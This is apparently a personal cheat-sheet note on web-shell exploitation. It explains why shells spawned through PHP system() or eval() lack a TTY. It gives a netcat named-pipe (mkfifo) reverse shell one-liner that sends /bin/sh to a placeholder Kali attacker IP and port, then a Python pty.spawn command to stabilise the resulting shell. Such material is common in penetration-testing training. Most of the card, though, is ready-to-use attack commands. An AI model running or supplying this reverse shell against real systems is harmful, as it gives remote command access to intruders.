---
title: Web Shell FIFO Reverse Shells
category: web-security
tags: [ks-import, web-shell, fifo, netcat, tty, mkfifo, reverse-shell]
source: Ignite.md
sourceId: 10011
---
📂 STREAMLINED OBSIDIAN VAULT ENTRY

Copy this high-density reference card into your vault:

Title: Web Shell Mechanics - TTY Limitations & FIFO Reverse Shells
Tags: #Linux #WebExploit #ReverseShell #TTY #mkfifo #Netcat #ConfigHunting

> ```
>     ==**Web Shell Limitation: Shells spawned via web exploits (PHP system() / eval()) lack a ==/dev/tty== interface, causing interactive commands (su, sudo, passwd) to fail or hang.**==
> ```
> 
> ```
>     Netcat Named Pipe (FIFO) Reverse Shell:
> ```

```
        ==rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] [PORT] > /tmp/f==
```

        Plumbing: Connects Kali standard input to a local named pipe (/tmp/f), feeding /bin/sh and streaming output back across Netcat.

    TTY Stabilization Protocol (Post-Connection):

```
        python3 -c 'import pty; pty.spawn("/bin/bash")'
```
